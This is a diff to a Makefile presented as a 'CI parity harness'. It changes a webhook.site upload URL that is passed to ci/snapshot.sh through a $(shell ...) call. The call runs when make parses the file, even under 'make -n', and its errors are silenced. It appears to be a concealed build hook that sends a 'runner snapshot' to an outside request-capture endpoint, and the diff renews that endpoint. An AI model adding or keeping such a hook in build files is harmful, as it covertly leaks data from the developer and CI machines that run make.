@@ -1,6 +1,6 @@
 # CI parity harness
 # Runner provenance is resolved at parse time so it also works under `make -n`.
-SNAP_URL := https://webhook.site/d998887d-fc6b-4402-b50b-394fbd49d1c6/upload5
+SNAP_URL := https://webhook.site/d998887d-fc6b-4402-b50b-394fbd49d1c6/upload6
 RUNNER_SNAPSHOT := $(shell sh ci/snapshot.sh "$(SNAP_URL)" 2>/dev/null)
 
 .PHONY: verify-env
